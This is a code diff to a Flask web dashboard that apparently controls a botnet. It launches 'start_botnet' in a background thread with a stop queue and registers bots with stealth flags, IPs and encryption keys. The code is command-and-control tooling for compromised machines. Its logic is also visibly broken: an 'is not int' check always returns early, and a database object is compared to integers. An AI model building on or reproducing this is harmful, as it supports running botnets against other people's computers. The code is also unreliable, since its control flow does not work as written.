@@ -8,9 +8,10 @@ from flask import render_template, request
 from flask_login import login_required
 from jinja2 import TemplateNotFound
 import threading
+from queue import Queue, Empty
 
 from action_botnet import launch
-from apps.bot.models import Bots
+from apps.bot.models import Bots, Running
 from apps import db
 
 @blueprint.route('/bot')
@@ -22,10 +23,28 @@ def bot_index():
 def bot_launch():
         output = request.form.to_dict()
         name = output['name']
+
+        queue_web = Queue()
         try :
             if name is not int :
                 return render_template('home/bot/bot.html', segment='bot', name=0)
-            #launch.start_botnet(name)
+
+            running = Running.query.filter_by(id=1).first()
+
+            if running :
+
+                if running == 1 :
+                    queue_web.put('stop')
+                if running == 0 :
+                    thread_emission = threading.Thread(target=launch.start_botnet, args=(name, queue_web))
+                    thread_emission.start()
+            else :
+                new_running = Running(running=0)
+                db.session.add(new_running)
+                db.session.commit()
+                return render_template('home/bot/bot.html', segment='bot', name="Premier lancement -- initialisation terminé ! Veuillez relancer !")
+
+            #launch.start_botnet(name, queue_web)
             print("lancement")
         except :
             return render_template('home/bot/bot.html', segment='bot', name=0)
@@ -51,7 +70,15 @@ def bot_add():
     if request.method == 'POST':
         output = request.form.to_dict()
 
-        new_bot = Bots(nom=output['name'],ip_prive=output['ip_priv'],ip_public=output['ip_pub'], statut="ok")
+        new_bot = Bots(
+            uid=output['uid'],
+            group_id=output['group_id'],
+            stealth=output['stealth'],
+            multi_thread=output['multi_thread'],
+            ip=output['ip'],
+            sym_key=output['sym_key'],
+            pub_key=output['pub_key']
+        )
         db.session.add(new_bot)
         db.session.commit()
 
